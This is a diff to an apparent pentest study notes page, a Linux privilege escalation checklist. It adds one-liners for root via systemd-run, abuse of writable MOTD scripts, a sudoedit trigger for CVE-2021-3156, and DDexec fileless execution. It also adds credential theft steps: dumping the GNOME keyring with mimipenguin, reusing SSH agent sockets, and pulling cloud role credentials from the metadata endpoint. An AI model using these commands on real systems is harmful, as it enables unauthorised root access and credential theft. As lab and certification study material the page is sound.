@@ -1,5 +1,6 @@
 +++
 title = 'Linux Privilege Escalation Checklist'
+description = 'Phase-by-phase Linux privilege escalation checklist: quick wins, credentials, sudo and SUID paths, cron and systemd, containers, Kubernetes, and kernel fallbacks.'
 date = 2026-10-30
 type = 'notes'
 weight = 70
@@ -50,6 +51,9 @@ tags = ['linux', 'privilege-escalation', 'checklist']
 
 - [ ] `sudo -l` shows `(ALL : ALL) ALL` → `sudo su -` **DONE**
 - [ ] `sudo -l` shows any binary → check [GTFOBins](https://gtfobins.github.io/) → escalate via sudo
+- [ ] `systemd-run --uid=0 --gid=0 /bin/sh` / `run0` (systemd ≥ 256) — polkit-mediated root with **no sudo rule**; `systemctl --user` scope units run outside the session's cgroup
+- [ ] `ls -la /etc/update-motd.d/ /etc/motd.d/ 2>/dev/null` — writable MOTD script runs as root on the next SSH login
+- [ ] `sudo --version` < 1.9.5p2 → `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` — Baron Samedit (CVE-2021-3156), no sudo rule needed
 - [ ] `ls -la /etc/passwd /etc/shadow` — writable? → [Writable /etc/passwd](/notes/linux-privilege-escalation/enumerating-attack-vectors/#writable-etcpasswd--etcshadow)
 - [ ] `ls -la /etc/ld.so.preload 2>/dev/null` — writable or creatable? → [ld.so.preload](/notes/linux-privilege-escalation/enumerating-attack-vectors/#ldsopreload--universal-linker-hijack)
 - [ ] `getcap -r / 2>/dev/null` — any `cap_setuid`, `cap_dac_*`, `cap_sys_admin`, `cap_setfcap`? → [Capabilities](/notes/linux-privilege-escalation/enumerating-attack-vectors/#linux-capabilities)
@@ -85,6 +89,12 @@ tags = ['linux', 'privilege-escalation', 'checklist']
 **Reuse**
 
 - [ ] Any password found → `su - <user>` / `sudo -l` / `ssh <user>@localhost` / try on other users
+
+**Keyrings, agents and cloud metadata**
+
+- [ ] `ls -la ~/.local/share/keyrings/ 2>/dev/null` — GNOME keyring; `mimipenguin` lifts it from memory while the session is unlocked
+- [ ] `env | grep SSH_AUTH_SOCK`; `ssh-add -l 2>/dev/null` — a live agent socket signs as the key owner, no passphrase needed
+- [ ] `curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null` — cloud instance role credentials from the target itself
 
 ---
 
@@ -163,6 +173,7 @@ tags = ['linux', 'privilege-escalation', 'checklist']
 
 - [ ] `busctl --system list 2>/dev/null` — privileged system-bus services
 - [ ] `ls -la /proc/*/fd/ 2>/dev/null | grep -E 'root|shadow|sudoers'` — writable FD to a root file
+- [ ] **Fileless execution:** `ptrace_scope` < 3 and a writable `/proc/self/mem` → DDexec loads a shell into a memfd with no on-disk artifact
 
 ---
 
@@ -244,3 +255,20 @@ Do not assume root is "a new SUID binary on disk." Modern post-exploitation and 
 - [ ] Two full passes with no lead → re-read `sudo -l`, `/etc/systemd/system`, `/etc/cron.*`, **process environments**, and **`/proc/*/fd`** — these are the most-missed
 - [ ] If time-boxed and stuck → pivot to network enumeration (Phase 7); a lateral host may be easier
 - [ ] If kernel exploit is the only path left → confirm architecture, keep a fallback shell, and choose a deterministic bug over a race
+
+---
+
+## Cross-Reference — Where Each Phase Lives in the Notes
+
+| Phase | Note page |
+|---|---|
+| Phase 1 — Quick wins (sudo, SUID, capabilities, `/etc/passwd`) | [Enumerating attack vectors](/notes/linux-privilege-escalation/enumerating-attack-vectors/) |
+| Phase 2 — Credentials from files, processes and logs | [Enumerating attack vectors](/notes/linux-privilege-escalation/enumerating-attack-vectors/) |
+| Phase 3 — Sudo, SUID and capabilities | [Capabilities abuse](/notes/linux-privilege-escalation/capabilities-abuse/) · [Privileged groups](/notes/linux-privilege-escalation/privileged-groups/) |
+| Phase 4 — Scheduled and background execution | [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) |
+| Phase 5 — Filesystem primitives | [Enumerating attack vectors](/notes/linux-privilege-escalation/enumerating-attack-vectors/) |
+| Phase 6 — Session, process and FD attacks | [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) |
+| Phase 10 — Supply chain / package managers | [Environment variables abuse](/notes/linux-privilege-escalation/environment-variables-abuse/) |
+| Phase 11 — Kernel and page-cache fallbacks | [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) |
+
+For the same technique described without a lab frame, use the [OSCP command checklist](/notes/oscp-labs/commands/); for the box where a phase decided the outcome, use the [pattern library](/notes/oscp-labs/patterns/).
